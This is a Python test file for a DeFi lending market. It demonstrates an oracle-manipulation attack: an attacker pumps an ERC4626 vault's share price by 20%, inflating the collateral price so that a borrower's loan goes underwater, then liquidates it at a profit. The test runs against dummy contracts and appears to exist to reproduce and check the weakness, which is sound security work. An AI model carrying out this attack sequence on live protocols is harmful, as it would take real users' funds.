"""
ERC4626 share-price pump liquidation
====================================

The CryptoFromOracleAndERC4626 oracle reports

    price = ORACLE.price() * VAULT.convertToAssets(1e18) / 1e18

so the collateral price scales linearly with the vault's share price.  An
attacker that can momentarily inflate the vault share price inflates the oracle
price by the same factor.

Scenario (mirrors tests/lending/test_oracle_attack.py but the price is bumped
through the ERC4626 share price instead of the base oracle):

  1. A market is created with CryptoFromOracleAndERC4626(ORACLE, VAULT) where
     ORACLE is a dummy spot oracle and VAULT is a dummy ERC4626 with a pumpable
     share price.
  2. The victim borrows the maximum against their collateral.
  3. The attacker trades through the whole victim position (pushes the AMM price
     up so all of the victim's collateral is converted to the borrowed token and
     ends up in the attacker's hands).
  4. The attacker pumps the VAULT share price by 20%, lifting the oracle price by
     20% and pushing the victim's health negative.
  5. The attacker liquidates the now-underwater victim.
"""

import boa

from tests.utils.constants import MAX_UINT256


N = 10
PUMP = 12 * 10**17  # +20% share price (1.2e18)


def test_erc4626_pump_liquidation(
    controller,
    amm,
    vault,
    admin,
    base_oracle,
    dummy_vault,
    price_oracle,
    borrowed_token,
    collateral_token,
):
    victim = boa.env.generate_address("victim")
    attacker = boa.env.generate_address("attacker")

    # Oracle price == ORACLE.price() while share price is 1.0
    p = price_oracle.price()
    assert p == base_oracle.price()
    assert dummy_vault.convertToAssets(10**18) == 10**18

    # Approvals
    for user in (victim, attacker):
        with boa.env.prank(user):
            for token in (borrowed_token, collateral_token):
                for contract in (controller, amm, vault):
                    token.approve(contract.address, MAX_UINT256)

    # ----- 2) victim borrows the maximum -----
    victim_collateral = 100 * 10 ** collateral_token.decimals()
    boa.deal(collateral_token, victim, victim_collateral)
    with boa.env.prank(victim):
        max_debt = controller.max_borrowable(victim_collateral, N)
        controller.create_loan(victim_collateral, max_debt, N)
    initial_health = controller.health(victim, True)
    assert initial_health > 0

    # ----- 3) attacker trades through the whole victim position -----
    # Push the AMM price up (exchange borrowed -> collateral) until the victim
    # is fully soft-liquidated: all collateral converted to the borrowed token.
    # Oversized: the AMM only holds the victim's collateral, so the exchange
    # buys all of it and stops, leaving the unused borrowed token with the
    # attacker.
    attacker_reserves = 5 * victim_collateral * p // 10**18
    boa.deal(borrowed_token, attacker, attacker_reserves)
    with boa.env.prank(attacker):
        amm.exchange(0, 1, attacker_reserves, 0)

    # Attacker capital == the borrowed token they started with.
    attacker_capital = attacker_reserves

    # Victim is now entirely in the borrowed token (no collateral left in AMM).
    victim_state = controller.user_state(victim)
    assert victim_state[0] == 0  # collateral
    assert victim_state[1] > 0  # borrowed

    # ----- 4) attacker pumps the VAULT share price by 20% -----
    dummy_vault.set_share_price(PUMP)
    assert price_oracle.price() == p * PUMP // 10**18

    # The pump pushes the victim underwater.
    hacked_health = controller.health(victim, True)
    assert hacked_health < 0

    # ----- 5) attacker liquidates the victim -----
    with boa.env.prank(attacker):
        controller.liquidate(victim, 0)

    assert not controller.loan_exists(victim)

    # Net attacker PnL across the whole attack, valuing the collateral they hold
    # at the *true* (un-pumped) price.
    final_borrowed = borrowed_token.balanceOf(attacker)
    final_collateral = collateral_token.balanceOf(attacker)
    # p is 1e18-scaled and relates 1e18-normalized amounts, so convert the
    # native-decimal collateral into native-decimal borrowed value.
    collateral_value = (
        final_collateral * p * 10 ** borrowed_token.decimals()
    ) // (10 ** collateral_token.decimals() * 10**18)
    net_profit = final_borrowed + collateral_value - attacker_capital

    print("collateral held:", final_collateral / 10 ** collateral_token.decimals())
    print("net profit:", net_profit / 10 ** borrowed_token.decimals())
    print("health:", initial_health / 1e18, "->", hacked_health / 1e18)

    # The attacker walks away with the victim's collateral at a profit.
    assert net_profit > 0
